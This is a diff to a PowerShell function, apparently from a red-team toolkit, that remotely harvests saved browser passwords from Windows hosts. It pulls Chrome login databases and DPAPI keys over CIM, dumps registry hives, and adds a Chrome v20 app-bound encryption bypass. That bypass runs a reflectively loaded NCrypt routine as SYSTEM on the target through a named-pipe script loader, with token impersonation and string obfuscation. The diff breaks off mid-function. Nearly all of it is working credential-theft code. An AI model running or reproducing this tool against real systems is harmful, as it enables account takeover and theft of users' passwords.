@@ -13,7 +13,7 @@ Function Get-CimDpapiBrowser {
     It also gets a copy of the SYSTEM and SECURITY hives via VSS from the remote host in order to extract system DPAPI keys.
     From local copies, Get-CimDpapiBrowser decrypts DPAPI master keys of system (using the DPAPI system keys retrieved) as well as domain users (using the supplied domain backup key).
     Finally, it attempts to decrypt DPAPI credential blobs using reachable master keys.
-    The decryption part is highly inspired from SharpDPAPI (by @harmj0y).
+    The decryption part is inspired from SharpDPAPI (by @harmj0y) and Invoke-PowerChrome (by @The-Viper-One).
 
 .PARAMETER ComputerName
     Specifies the target host.
@@ -35,6 +35,9 @@ Function Get-CimDpapiBrowser {
 
 .PARAMETER DomainOnly
     Disables DPAPI system key retrieval, to avoid registry hive dump.
+
+.PARAMETER Confirm
+    Enables remote command execution if needed (required for v20 blobs decryption).
 
 .EXAMPLE
     PS C:\> Get-CimDpapiBrowser -ComputerName SRV.ADATUM.CORP -Credential ADATUM\Administrator -BackupKeyFile .\domain_backup.pvk
@@ -67,7 +70,10 @@ Function Get-CimDpapiBrowser {
         $BackupKeyFile,
 
         [Switch]
-        $DomainOnly
+        $DomainOnly,
+
+        [Switch]
+        $Confirm
     )
 
     Begin {
@@ -84,66 +90,105 @@ Function Get-CimDpapiBrowser {
         $formatDefaultLimit = $global:FormatEnumerationLimit
         $global:mappedDrives = New-Object Collections.ArrayList
 
-        Function Local:Get-RemoteFile {
-            Param (
-                [Parameter(Mandatory = $True)]
-                [String]
-                $Path,
+        Function Local:Decrypt-WithNCrypt {
+            Param ([byte[]]$InputData)
+            Function Local:Get-DelegateType {
+                Param (
+                    [Type[]]
+                    $Parameters = (New-Object Type[](0)),
 
-                [Parameter(Mandatory = $True)]
-                [String]
-                $Destination,
+                    [Type]
+                    $ReturnType = [Void]
+                )
+                $domain = [AppDomain]::CurrentDomain
+                $dynAssembly = New-Object Reflection.AssemblyName('ReflectedDelegate')
+                $assemblyBuilder = $domain.DefineDynamicAssembly($dynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
+                $moduleBuilder = $assemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
+                $typeBuilder = $moduleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [MulticastDelegate])
+                $constructorBuilder = $typeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [Reflection.CallingConventions]::Standard, $Parameters)
+                $constructorBuilder.SetImplementationFlags('Runtime, Managed')
+                $methodBuilder = $typeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
+                $methodBuilder.SetImplementationFlags('Runtime, Managed')
+                Write-Output $typeBuilder.CreateType()
+            }
+            Function Local:Get-ProcAddress {
+                Param (
+                    [Parameter(Mandatory = $True)]
+                    [String]
+                    $Module,
 
-                [ValidateNotNullOrEmpty()]
-                [String]
-                $ComputerName = $env:COMPUTERNAME,
-
-                [ValidateNotNullOrEmpty()]
-                [Management.Automation.PSCredential]
-                [Management.Automation.Credential()]
-                $Credential = [Management.Automation.PSCredential]::Empty
-            )
-            Begin {
-                Function Local:Get-StringHash ([String]$String, $Algorithm="MD5") {
-                    $stringBuilder = New-Object System.Text.StringBuilder
-                    [Security.Cryptography.HashAlgorithm]::Create($Algorithm).ComputeHash([Text.Encoding]::UTF8.GetBytes($String)) | % {
-                        [Void]$stringBuilder.Append($_.ToString("x2"))
-                    }
-                    return $stringBuilder.ToString()
+                    [Parameter(Mandatory = $True)]
+                    [String]
+                    $Procedure
+                )
+                $dll = ([regex]::Matches("lld.metsyS", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
+                $systemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($dll) }
+                $unsafeNativeMethods = $systemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
+                $getModuleHandle = $unsafeNativeMethods.GetMethod('GetModuleHandle')
+                $getProcAddress = $unsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([Runtime.InteropServices.HandleRef], [String]))
+                $kern32Handle = $getModuleHandle.Invoke($null, @($Module))
+                $tmpPtr = New-Object IntPtr
+                $handleRef = New-Object Runtime.InteropServices.HandleRef($tmpPtr, $kern32Handle)
+                Write-Output $getProcAddress.Invoke($null, @([Runtime.InteropServices.HandleRef]$handleRef, $Procedure))
+            }
+            $LoadLibraryAAddr = Get-ProcAddress kernel32.dll LoadLibraryA
+            $LoadLibraryADelegate = Get-DelegateType @([string]) ([IntPtr])
+            $LoadLibraryA = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAAddr, $LoadLibraryADelegate)
+            $libraryHandle = $LoadLibraryA.Invoke("ncrypt.dll")
+            if ($libraryHandle -eq [IntPtr]::Zero) {
+                throw "Failed to load ncrypt.dll"
+            }
+            $NCryptOpenStorageProviderAddr = Get-ProcAddress ncrypt.dll NCryptOpenStorageProvider
+            $NCryptOpenStorageProviderDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [IntPtr], [int]) ([int])
+            $NCryptOpenStorageProvider = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NCryptOpenStorageProviderAddr, $NCryptOpenStorageProviderDelegate)
+            $NCryptOpenKeyAddr = Get-ProcAddress ncrypt.dll NCryptOpenKey
+            $NCryptOpenKeyDelegate = Get-DelegateType @([IntPtr], [IntPtr].MakeByRefType(), [IntPtr], [int], [int]) ([int])
+            $NCryptOpenKey = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NCryptOpenKeyAddr, $NCryptOpenKeyDelegate)
+            $NCryptDecryptAddr = Get-ProcAddress ncrypt.dll NCryptDecrypt
+            $NCryptDecryptDelegate = Get-DelegateType @([IntPtr], [byte[]], [int], [IntPtr], [byte[]], [int], [Int32].MakeByRefType(), [uint32]) ([int])
+            $NCryptDecrypt = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NCryptDecryptAddr, $NCryptDecryptDelegate)
+            $NCryptFreeObjectAddr = Get-ProcAddress ncrypt.dll NCryptFreeObject
+            $NCryptFreeObjectDelegate = Get-DelegateType @([IntPtr]) ([int])
+            $NCryptFreeObject = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NCryptFreeObjectAddr, $NCryptFreeObjectDelegate)
+            try {
+                $ProviderName = "Microsoft Software Key Storage Provider"
+                $KeyName = "Google Chromekey1"
+                $NcryptSilentFlag = 0x40
+                $ProviderHandle = [IntPtr]::Zero
+                $KeyHandle = [IntPtr]::Zero
+                $ProviderNamePointer = [Runtime.InteropServices.Marshal]::StringToHGlobalUni($ProviderName)
+                $Status = $NCryptOpenStorageProvider.Invoke([ref]$ProviderHandle, $ProviderNamePointer, 0)
+                [Runtime.InteropServices.Marshal]::FreeHGlobal($ProviderNamePointer)
+                if ($Status -ne 0) {
+                    throw "NCryptOpenStorageProvider failed ($Status)"
+                }
+                $KeyNamePointer = [Runtime.InteropServices.Marshal]::StringToHGlobalUni($KeyName)
+                $Status = $NCryptOpenKey.Invoke($ProviderHandle, [ref]$KeyHandle, $KeyNamePointer, 0, 0)
+                [Runtime.InteropServices.Marshal]::FreeHGlobal($KeyNamePointer)
+                if ($Status -ne 0) {
+                    throw "NCryptOpenKey failed ($Status)"
+                }
+                $OutputSize = 0
+                $Status = $NCryptDecrypt.Invoke($KeyHandle, $InputData, $InputData.Length, [IntPtr]::Zero, $null, 0, [ref]$OutputSize, $NcryptSilentFlag)
+                if ($Status -ne 0) {
+                    throw "NCryptDecrypt (size query) failed ($Status)"
+                }
+                $OutputBytes = New-Object byte[] $OutputSize
+                $Status = $NCryptDecrypt.Invoke($KeyHandle, $InputData, $InputData.Length, [IntPtr]::Zero, $OutputBytes, $OutputBytes.Length, [ref]$OutputSize, $NcryptSilentFlag)
+                if ($Status -ne 0) {
+                    throw "NCryptDecrypt (actual decrypt) failed ($Status)"
                 }
             }
-            Process {
-                # Download file via SMB
-                $fileDrive = ($Path -split ':').Get(0)
-                $filePath = ($Path -split ':').Get(1)
-                if ($Credential.Username) {
-                    $sharePath = "\\$ComputerName\$fileDrive`$"
-                    $localDrive = Get-StringHash $sharePath.ToLower()
-                    if (-not $global:mappedDrives.Contains($localDrive)) {
-                        New-PSDrive -Name $localDrive -Root $sharePath -PSProvider "FileSystem" -Credential $Credential -Scope Global | Out-Null
-                        $global:mappedDrives.add($localDrive) | Out-Null
-                    }
-                    Copy-Item -Path "${localDrive}:$filePath" -Destination $Destination -Recurse
+            finally {
+                if ($KeyHandle -ne [IntPtr]::Zero) {
+                    [void]$NCryptFreeObject.Invoke($KeyHandle)
                 }
-                else {
-                    Copy-Item -Path "\\$ComputerName\$fileDrive`$$filePath" -Destination $Destination -Recurse
+                if ($ProviderHandle -ne [IntPtr]::Zero) {
+                    [void]$NCryptFreeObject.Invoke($ProviderHandle)
                 }
             }
-            End {}
+            return $OutputBytes
         }
-
-        Function Local:ByteArrayEquals {
-            Param ([byte[]] $SourceArray, [int] $SourceIndex, [byte[]] $DestArray, [int] $DestIndex, [int] $Len)
-            $j = $DestIndex
-            for ($i = $SourceIndex; $i -lt $SourceIndex + $Len; $i++) {
-                if ($SourceArray[$i] -ne $DestArray[$j]) {
-                    return $false
-                }
-                $j++
-            }
-            return $true
-        }
-
     }
 
     Process {
@@ -293,6 +338,10 @@ Function Get-CimDpapiBrowser {
                     localStatePath = "\AppData\Local\Google\Chrome Beta\User Data\Local State"
                 }
                 @{
+                    loginDataPath = "\AppData\Local\Google\Chrome for Testing\User Data\Default\Login Data"
+                    localStatePath = "\AppData\Local\Google\Chrome for Testing\User Data\Local State"
+                }
+                @{
                     loginDataPath = "\AppData\Local\Chromium\User Data\Default\Login Data"
                     localStatePath = "\AppData\Local\Chromium\\User Data\Local State"
                 }
@@ -311,9 +360,9 @@ Function Get-CimDpapiBrowser {
             )
             Get-CimInstance -ClassName Win32_UserProfile -CimSession $cimSession -Verbose:$false | ForEach-Object {
                 $profilePath = $_.LocalPath
+                $profiles = New-Object Collections.ArrayList
                 foreach ($browserFilePath in $browserFilePaths) {
-                    $stateKey = $null
-                    # Copy state file locally
+                    # Copy AES state key file locally
                     $outputFile = ""
                     $filePath = ($profilePath + $browserFilePath['localStatePath']).Replace('\','\\')
                     $filter = "Name='$filePath'"
@@ -323,34 +372,7 @@ Function Get-CimDpapiBrowser {
                         $outputFile = "$outputDirectory\$($temp.Get($temp.Count - 1))_$($file.FileName)"
                         New-Item -ItemType Directory -Force -Path $outputDirectory | Out-Null
                         Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -Credential $Credential
-
-                        # Get Base64 encrypted key from AES state key file
-                        $base64StateKey = $null
-                        $localStateData = [IO.File]::ReadAllText($outputFile)
-                        $searchTerm = '"encrypted_key"'
-                        $indexPadding = 2
-                        $startIndex = $localStateData.IndexOf($searchTerm)
-                        if ($startIndex -lt 0) {
-                            $searchTerm = "encrypted_key"
-                            $indexPadding = 3
-                            $startIndex = $localStateData.IndexOf($searchTerm);
-                        }
-                        if ($startIndex -ge 0) {
-                            $keyIndex = $startIndex + $searchTerm.Length + $indexPadding
-                            $tempVals = $localStateData.Substring($keyIndex)
-                            $stopIndex = $tempVals.IndexOf('"')
-                            if ($stopIndex -ge 0) {
-                                $base64StateKey = $tempVals.Substring(0, $stopIndex)
-                            }
-                        }
-
-                        if ($base64StateKey) {
-                            # Decrypt the BCrypt key using the master key
-                            $encryptedKeyBytes = [Convert]::FromBase64String($base64StateKey)
-                            $encryptedKey = New-Object byte[] $($encryptedKeyBytes.Length - 5)
-                            [Array]::Copy($encryptedKeyBytes, 5, $encryptedKey, 0, $encryptedKeyBytes.Length - 5)
-                            $stateKey = Decrypt-DpapiBlob -BlobBytes $encryptedKey -MasterKeys $masterKeys -GuidOffset 24 -Padding $([Security.Cryptography.PaddingMode]::PKCS7)
-                        }
+                        $localState = Get-Content $outputFile -Raw | ConvertFrom-Json
                     }
 
                     # Copy login data file locally
@@ -367,114 +389,129 @@ Function Get-CimDpapiBrowser {
                         continue
                     }
 
-                    $someResults = $false
                     [SQLite.SQLiteConnection] $database = $null
                     $database = New-Object SQLite.SQLiteConnection($outputFile, $false)
                     $query = "SELECT signon_realm, origin_url, username_value, password_value, times_used, cast(date_created as text) as date_created FROM logins"
                     $results = $database.Query2($query, $false)
+                    $credentials = New-Object Collections.ArrayList
                     foreach ($row in $results) {
                         [byte[]] $passwordBytes = $row.column[3].Value
                         [byte[]] $decBytes = $null
-                        $DPAPI_CHROME_UNKV10 = [Text.UTF8Encoding]::UTF8.GetBytes("v10")
-                        $hasV10Header = ByteArrayEquals -SourceArray $passwordBytes -SourceIndex 0 -DestArray $DPAPI_CHROME_UNKV10 -DestIndex 0 -Len 3
-                        $DPAPI_CHROME_UNKV20 = [Text.UTF8Encoding]::UTF8.GetBytes("v20")
-                        $hasV20Header = ByteArrayEquals -SourceArray $passwordBytes -SourceIndex 0 -DestArray $DPAPI_CHROME_UNKV20 -DestIndex 0 -Len 3
-                        if ($hasV10Header) {
-                            if (-not $stateKey) {
+                        $blobVersion = [Text.Encoding]::ASCII.GetString($passwordBytes, 0, [Math]::Min(3, $passwordBytes.Length))
+                        $cred = [ordered]@{}
+                        $cred['UserName'] = $row.column[2].Value
+                        $cred['EncryptedPassword'] = $row.column[3].Value
+                        $cred['BlobVersion'] = $blobVersion
+                        $cred['TargetName'] = "$($row.column[0].Value)"
+                        $cred['TargetAlias'] = "$($row.column[1].Value)"
+                        $credentials.Add((New-Object PSObject -Property $cred)) | Out-Null
+                    }
+                    $database.Close()
+
+                    $decryptedKey = $null
+                    if ($credentials.BlobVersion -contains 'v10') {
+                        $encKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)
+                        $encryptedKey = $encKey[5..($encKey.Length - 1)]
+                    }
+                    elseif ($credentials.BlobVersion -contains 'v20') {
+                        $appBoundEncKey = [Convert]::FromBase64String($localState.os_crypt.app_bound_encrypted_key)
+                        if ([Text.Encoding]::ASCII.GetString($appBoundEncKey[0..3]) -ne "APPB") {
+                            Write-Output "No valid APPB header."
+                            continue
+                        }
+                        $encryptedKey = $appBoundEncKey[4..($appBoundEncKey.Length - 1)]
+                    }
+
+                    $profile = [ordered]@{}
+                    $profile['EncryptedKey'] = $encryptedKey
+                    $profile['Credentials'] = $credentials
+                    $profile['Location'] = $file.Name
+                    $profile['CreationDate'] = $file.CreationDate
+                    $profile['LastModified'] = $file.LastModified
+                    $profiles.Add((New-Object PSObject -Property $profile)) | Out-Null
+                }
+
+                foreach ($profile in $profiles) {
+                    $decryptedKey = $null
+                    if ($profile.Credentials.BlobVersion -contains 'v20') {
+                        try {
+                            # Process first DPAPI decryption using system masterkey
+                            $first = Decrypt-DpapiBlob -BlobBytes $profile.EncryptedKey -MasterKeys $masterKeys -GuidOffset 24 -Padding $([Security.Cryptography.PaddingMode]::PKCS7)
+                        }
+                        catch {
+                            Write-Error "[$ComputerName] First decryption failed: $($_.Exception.Message)"
+                            continue
+                        }
+                        if (-not $first -or $first.Length -eq 0) {
+                            Write-Error "[$ComputerName] First decryption produced no data."
+                            continue
+                        }
+
+                        try {
+                            # Process second DPAPI decryption using user masterkey
+                            $second = Decrypt-DpapiBlob -BlobBytes $first -MasterKeys $masterKeys -GuidOffset 24 -Padding $([Security.Cryptography.PaddingMode]::PKCS7)
+                            $parsed = Parse-ChromeKeyBlob -BlobData $second
+                            if ($parsed.Flag -eq 3) {
+                                if ($Confirm -or (Read-Host "[$ComputerName] Remote command execution is required to decrypt v20 blob. Continue? (y/n)") -eq 'y') {
+                                    # Decrypt the BCrypt key on the remote system using the Google Chrome key
+                                    [byte[]]$decryptedAesKey = Invoke-CommandAsSystem -ScriptBlock ${function:Decrypt-WithNCrypt} -ArgumentList ($parsed.EncryptedAesKey),$null -CimSession $cimSession -Credential $Credential
+                                    if ($decryptedAesKey) {
+                                        [byte[]]$xorKey = ConvertFrom-Hex "CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390"
+                                        $xoredAesKey = XorBytes -FirstArray $decryptedAesKey -SecondArray $xorKey
+                                        $decryptedKey = Decrypt-WithAesGcm -Key $xoredAesKey -Iv $parsed.Iv -Ciphertext $parsed.Ciphertext -Tag $parsed.Tag
+                                    }
+                                }
+                                else {
+                                    continue
+                                }
+                            }
+                            else {
+                                Write-Error "[$ComputerName] Unsupported flag: $($parsed.Flag)"
                                 continue
                             }
-                            try {
-                                # Initialize the BCrypt key
-                                [IntPtr]$hAlg = [IntPtr]::Zero
-                                [IntPtr]$hKey = [IntPtr]::Zero
-                                $ntStatus = [BCrypt]::BCryptOpenAlgorithmProvider([Ref]$hAlg, "AES", $null, 0)
-                                $ntStatus = [BCrypt]::BCryptSetProperty($hAlg, "ChainingMode", "ChainingModeGCM", 0)
-                                $ntStatus = [BCrypt]::BCryptGenerateSymmetricKey($hAlg, [Ref]$hKey, $null, 0, $stateKey, $stateKey.Length, 0)
-                                # Decrypt the password bytes using the BCrypt key
-                                [byte[]] $iv = @(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
-                                [Array]::Copy($passwordBytes, 3, $iv, 0, 12)
-                                $buffer = New-Object byte[] ($passwordBytes.Length - 15)
-                                [Array]::Copy($passwordBytes, 15, $buffer, 0, $passwordBytes.Length - 15)
-                                $tag = New-Object byte[] 16
-                                $cipherText = New-Object byte[] ($buffer.Length - $tag.Length)
-                                [Array]::Copy($buffer, $buffer.Length - 16, $tag, 0, 16)
-                                [Array]::Copy($buffer, 0, $cipherText, 0, $buffer.Length - $tag.Length)
-                                $authInfo = New-Object -TypeName BCrypt+BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
-                                $authInfo.dwInfoVersion = 1
-                                $authInfo.cbSize = [Runtime.InteropServices.Marshal]::SizeOf([type][BCrypt+BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO])
-                                $cbNonce = $iv.Length # 12
-                                $pbNonce = [Runtime.InteropServices.Marshal]::AllocHGlobal($cbNonce)
-                                [Runtime.InteropServices.Marshal]::Copy($iv, 0, $pbNonce, $cbNonce)
-                                $authInfo.cbNonce = $cbNonce
-                                $authInfo.pbNonce = $pbNonce
-                                $cbTag = $tag.Length
-                                $pbTag = [Runtime.InteropServices.Marshal]::AllocHGlobal($cbTag)
-                                [Runtime.InteropServices.Marshal]::Copy($tag, 0, $pbTag, $cbTag);
-                                $authInfo.cbTag = $cbTag
-                                $authInfo.pbTag = $pbTag
-                                #$cbMacContext = $tag.Length
-                                #$authInfo.cbMacContext = $cbMacContext
-                                #$authInfo.pbMacContext = [Runtime.InteropServices.Marshal]::AllocHGlobal($cbMacContext)
-                                $size = 0
-                                $ntStatus = [BCrypt]::BCryptGetProperty($hAlg, "AuthTagLength", $null, 0, [ref] $size, 0x0)
-                                if ($ntStatus -ne 0) {
-                                    continue
-                                }
-                                $tagLengthsValue = New-Object byte[] $size
-                                $ntStatus = [BCrypt]::BCryptGetProperty($hAlg, "AuthTagLength", $tagLengthsValue, $tagLengthsValue.Length, [ref] $size, 0x0)
-                                if ($ntStatus -ne 0) {
-                                    continue
-                                }
-                                $maxAuthTagSize = [BitConverter]::ToInt32(@($tagLengthsValue[4], $tagLengthsValue[5], $tagLengthsValue[6], $tagLengthsValue[7]), 0)
-                                $ivData = New-Object byte[] $maxAuthTagSize
-                                $plainTextSize = 0
-                                $ntStatus = [BCrypt]::BCryptDecrypt($hKey, $cipherText, $cipherText.Length, [ref] $authInfo, $ivData, $ivData.Length, $null, 0, [ref] $plainTextSize, 0)
-                                if ($ntStatus -ne 0) {
-                                    continue
-                                }
-                                $decBytes = New-Object byte[] $plainTextSize
-                                $ntStatus = [BCrypt]::BCryptDecrypt($hKey, $cipherText, $cipherText.Length, [ref] $authInfo, $ivData, $ivData.Length, $decBytes, $decBytes.Length, [ref] $plainTextSize, 0)
-                                if ($ntStatus -ne 0) {
-                                    continue
-                                }
-                                
-                            }
-                            catch {
-                                Write-Error $_
-                            }
-                            finally {
-                                if ($pbNonce) {
-                                    [Runtime.InteropServices.Marshal]::FreeHGlobal($pbNonce)
-                                }
-                                if ($cbTag) {
-                                    [Runtime.InteropServices.Marshal]::FreeHGlobal($cbTag)
-                                }
-                                <#
-                                if ($cbMacContext) {
-                                    [Runtime.InteropServices.Marshal]::FreeHGlobal($cbMacContext)
-                                }
-                                #>
-                            }
                         }
-                        elseif ($hasV20Header) {
-                            Write-Warning "[$ComputerName] Chrome version is not supported."
+                        catch {
+                            Write-Error "[$ComputerName] Second decryption failed: $($_.Exception.Message)"
+                            continue
+                        }
+
+                    }
+                    elseif ($profile.Credentials.BlobVersion -contains 'v10') {
+                            # Decrypt the BCrypt key using the user master key
+                            $decryptedKey = Decrypt-DpapiBlob -BlobBytes $profile.EncryptedKey -MasterKeys $masterKeys -GuidOffset 24 -Padding $([Security.Cryptography.PaddingMode]::PKCS7)
+                    }
+
+
+                    foreach ($cred in $profile.Credentials) {
+                        $passwordBytes = $cred.EncryptedPassword
+                        if ($decryptedKey) {
+                            # Decrypt the password bytes using the BCrypt key
+                            [byte[]] $iv = @(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
+                            [Array]::Copy($passwordBytes, 3, $iv, 0, 12)
+                            $buffer = New-Object byte[] ($passwordBytes.Length - 15)
+                            [Array]::Copy($passwordBytes, 15, $buffer, 0, $passwordBytes.Length - 15)
+                            $tag = New-Object byte[] 16
+                            $cipherText = New-Object byte[] ($buffer.Length - $tag.Length)
+                            [Array]::Copy($buffer, $buffer.Length - 16, $tag, 0, 16)
+                            [Array]::Copy($buffer, 0, $cipherText, 0, $buffer.Length - $tag.Length)
+                            $decBytes = Decrypt-WithAesGcm -Key $decryptedKey -Iv $iv -Ciphertext $cipherText -Tag $tag
                         }
                         else {
-                            # Try to decrypt the password bytes using the master key
+                            # Try to decrypt the password bytes using the user master key
                             $decBytes = Decrypt-DpapiBlob -BlobBytes $passwordBytes -MasterKeys $masterKeys -GuidOffset 24 -Padding $([Security.Cryptography.PaddingMode]::PKCS7)
                         }
 
                         if ($decBytes) {
-                            $cred = [ordered]@{}
-                            $cred['UserName'] = $row.column[2].Value
-                            $cred['Password'] = [Text.Encoding]::UTF8.GetString($decBytes)
-                            $cred['URL'] = "$($row.column[0].Value) ($($row.column[1].Value))"
+                            $c = [ordered]@{}
+                            $c['UserName'] = $cred.UserName
+                            $c['Password'] = [Text.Encoding]::UTF8.GetString($decBytes)
+                            $c['URL'] = "$($cred.TargetName) ($($cred.TargetAlias))"
                             $result = New-Object -TypeName PSObject
                             $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
-                            $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $file.Name
-                            $result | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value (New-Object PSObject -Property $cred)
-                            $result | Add-Member -MemberType NoteProperty -Name 'CreationDate' -Value $file.CreationDate
-                            $result | Add-Member -MemberType NoteProperty -Name 'LastModified' -Value $file.LastModified
+                            $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $profile.Location
+                            $result | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value (New-Object PSObject -Property $c)
+                            $result | Add-Member -MemberType NoteProperty -Name 'CreationDate' -Value $profile.CreationDate
+                            $result | Add-Member -MemberType NoteProperty -Name 'LastModified' -Value $profile.LastModified
                             Write-Output $result
                         }
                     }
@@ -507,7 +544,314 @@ Function Get-CimDpapiBrowser {
     }
 }
 
-Function Get-ShadowLsaDpapiKey {
+Function Local:Invoke-UserImpersonation {
+    [OutputType([IntPtr])]
+    Param (
+        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
+        [Management.Automation.PSCredential]
+        [Management.Automation.CredentialAttribute()]
+        $Credential,
+
+        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
+        [ValidateNotNull()]
+        [IntPtr]
+        $TokenHandle,
+
+        [Switch]
+        $Quiet
+    )
+
+    if (([Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet'])) {
+        Write-Warning "[UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
+    }
+
+    if ($PSBoundParameters['TokenHandle']) {
+        $LogonTokenHandle = $TokenHandle
+    }
+    else {
+        $LogonTokenHandle = [IntPtr]::Zero
+        $NetworkCredential = $Credential.GetNetworkCredential()
+        $UserDomain = $NetworkCredential.Domain
+        $UserName = $NetworkCredential.UserName
+        Write-Verbose "[UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName)"
+
+        if (-not [Native]::LogonUserA($UserName, $UserDomain, $NetworkCredential.Password, 9, 3, [ref]$LogonTokenHandle)) {
+            $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+            throw "[UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
+        }
+    }
+
+    if (-not [Native]::ImpersonateLoggedOnUser($LogonTokenHandle)) {
+        throw "[UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
+    }
+    $LogonTokenHandle
+}
+
+Function Local:Invoke-RevertToSelf {
+    Param (
+        [ValidateNotNull()]
+        [IntPtr]
+        $TokenHandle
+    )
+
+    if ($PSBoundParameters['TokenHandle']) {
+        Write-Verbose "[RevertToSelf] Reverting token impersonation and closing LogonUser() token handle"
+        [Native]::CloseHandle($TokenHandle) | Out-Null
+    }
+    if (-not [Native]::RevertToSelf()) {
+        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+        throw "[RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
+    }
+}
+
+Function Local:Invoke-CommandAsSystem {
+    [CmdletBinding()]
+    Param (
+        [ValidateNotNullOrEmpty()]
+        [Management.Automation.PSCredential]
+        [Management.Automation.Credential()]
+        $Credential = [Management.Automation.PSCredential]::Empty,
+
+        [Parameter(ValueFromPipelineByPropertyName = $True)]
+        [Microsoft.Management.Infrastructure.CimSession[]]
+        $CimSession,
+
+        [Parameter(Mandatory = $true)]
+        [ScriptBlock]
+        $ScriptBlock,
+
+        [Object[]]
+        $ArgumentList
+    )
+
+    Begin {
+        $clauseNb = 0
+        if ($ScriptBlock.Ast.BeginBlock) {$clauseNb++}
+        if ($ScriptBlock.Ast.ProcessBlock) {$clauseNb++}
+        if ($ScriptBlock.Ast.EndBlock) {$clauseNb++}
+        if ($clauseNb -gt 1) {
+            Write-Error 'The script block cannot be invoked because it contains more than one clause. The Invoke() method can only be used on script blocks that contain a single clause.'
+            continue
+        }
+        if ($Credential.UserName) {
+            $logonToken = Invoke-UserImpersonation -Credential $Credential
+        }
+    }
+
+    Process {
+        # Init named pipe client
+        $computerName = $cimSession.ComputerName
+        $pipeTimeout = 10000 # 10s
+        $pipename = [guid]::NewGuid().Guid
+        $pipeclient = New-Object IO.Pipes.NamedPipeClientStream($computerName, $pipename, [IO.Pipes.PipeDirection]::InOut, [IO.Pipes.PipeOptions]::None, [Security.Principal.TokenImpersonationLevel]::Impersonation)
+
+        # Build loader
+        $loader = ''
+        $loader += '$s = New-Object IO.Pipes.NamedPipeServerStream(''' + $pipename + ''', 3); '
+        $loader += '$s.WaitForConnection(); '
+        $loader += '$r = New-Object IO.StreamReader $s; '
+        $loader += '$x = ''''; '
+        $loader += 'while (($y=$r.ReadLine()) -ne ''''){$x+=$y+[Environment]::NewLine}; '
+        $loader += '$z = [ScriptBlock]::Create($x); '
+        $loader += '& $z'
+        $argument = '-NoP -NonI -W 1 -C "' + $loader + '"'
+
+        # Build payload
+        $script = ''
+        $compressedStream = New-Object IO.MemoryStream
+        $deflateStream = New-Object IO.Compression.DeflateStream ($compressedStream, [IO.Compression.CompressionMode]::Compress)
+        $serializedScriptBlock = [Text.Encoding]::Unicode.GetBytes([Management.Automation.PSSerializer]::Serialize($ScriptBlock))
+        $length = $serializedScriptBlock.Length
+        $deflateStream.Write($serializedScriptBlock, 0, $length)
+        $deflateStream.Dispose()
+        $compressedScriptBlock = $compressedStream.ToArray()
+        $compressedStream.Dispose()
+        $encScriptBlock = [Convert]::ToBase64String($compressedScriptBlock)
+        $script += "`$encScriptBlock = '$encScriptBlock'" + [Environment]::NewLine
+        $script += '$deflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($encScriptBlock),[IO.Compression.CompressionMode]::Decompress)' + [Environment]::NewLine
+        $script += '$serializedScriptBlock = New-Object Byte[](' + $length + ')' + [Environment]::NewLine
+        $script += '$deflatedStream.Read($serializedScriptBlock, 0, ' + $length + ') | Out-Null' + [Environment]::NewLine
+        $script += '$deflatedStream.Dispose()' + [Environment]::NewLine
+        $script += '$scriptBlock = [ScriptBlock]::Create([Management.Automation.PSSerializer]::Deserialize([Text.Encoding]::Unicode.GetString($serializedScriptBlock)))' + [Environment]::NewLine
+        if ($ArgumentList) {
+            $compressedStream = New-Object IO.MemoryStream
+            $deflateStream = New-Object IO.Compression.DeflateStream ($compressedStream, [IO.Compression.CompressionMode]::Compress)
+            $serializedArgs = [Text.Encoding]::Unicode.GetBytes([Management.Automation.PSSerializer]::Serialize($ArgumentList))
+            $length = $serializedArgs.Length
+            $deflateStream.Write($serializedArgs, 0, $length)
+            $deflateStream.Dispose()
+            $compressedArgs = $compressedStream.ToArray()
+            $compressedStream.Dispose()
+            $encArgs = [Convert]::ToBase64String($compressedArgs)
+            $script += "`$encArgs = '$encArgs'" + [Environment]::NewLine
